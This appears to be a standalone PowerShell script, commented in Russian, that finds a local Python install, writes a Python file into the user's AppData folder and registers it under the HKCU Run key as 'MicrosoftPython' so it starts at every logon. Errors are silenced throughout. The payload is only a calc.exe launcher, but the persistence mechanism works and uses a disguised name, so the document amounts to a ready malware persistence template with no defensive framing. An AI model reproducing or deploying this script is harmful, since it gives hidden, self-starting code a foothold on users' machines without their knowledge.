$ErrorActionPreference = 'SilentlyContinue'

# Ищем Python в стандартных путях
$pythonPaths = @(
    "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe",
    "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
    "$env:LOCALAPPDATA\PythonEmbed\python.exe",
    "$env:APPDATA\Python\python.exe"
)

$pythonExe = $null
foreach ($path in $pythonPaths) {
    if (Test-Path $path) {
        $pythonExe = $path
        break
    }
}

if ($pythonExe) {
    # Создаем Python скрипт
    $scriptCode = @'
import subprocess
subprocess.Popen("calc.exe", shell=True)
'@
    
    $scriptPath = "$env:APPDATA\runner.py"
    $scriptCode | Out-File $scriptPath -Encoding UTF8
    
    # Добавляем в автозагрузку
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MicrosoftPython" 
    $command = "`"$pythonExe`" `"$scriptPath`""
    
    New-ItemProperty -Path $regPath -Name $regName -Value $command -Force | Out-Null
    
    Write-Output "Success: Python configured at $pythonExe"
} else {
    Write-Output "Error: Python not found in standard locations"
}